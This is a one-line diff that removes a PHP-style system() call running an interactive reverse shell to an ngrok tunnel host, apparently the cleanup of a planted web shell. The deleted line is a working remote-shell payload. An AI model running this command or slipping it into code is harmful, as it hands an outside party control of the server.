@@ -1,1 +1,0 @@
-<pre>system('/bin/sh -i >& /dev/tcp/5.tcp.eu.ngrok.io/11025 0>&1')</pre>
